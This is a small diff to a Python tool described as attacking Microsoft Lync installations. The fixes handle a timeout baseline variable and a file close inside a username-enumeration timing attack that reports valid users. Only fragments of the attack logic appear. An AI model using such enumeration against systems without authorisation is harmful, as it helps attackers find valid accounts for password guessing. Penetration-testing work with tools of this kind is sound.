@@ -21,7 +21,7 @@ except:
         pass
 
 validCred = False
-
+timeout = 0
 
 def main():
         parser = argparse.ArgumentParser(description='Attack Microsoft Lync installations')
@@ -59,6 +59,7 @@ def main():
 
                 if os.path.isfile(args.usernames):
                         print_status('Getting timeout baseline')
+                        global timeout
                         timeout = baseline_timeout(args.host, args.domain)
                         if timeout:
                                 print_status("Average timeout is: {0}".format(timeout))
@@ -75,7 +76,7 @@ def main():
                                     pass_file.close()
 
 
-                                user_file.close()
+
                 else:
                         print_error('Could not find username file')
 
@@ -148,6 +149,7 @@ def timing_attack(host,userfilepath,password,domain):
                  else:
                      print_good("Valid User, Invalid Password: {0}".format(user))
              print ''
+    user_file.close()
 
 
 # Determine the baseline timeout for invalid username
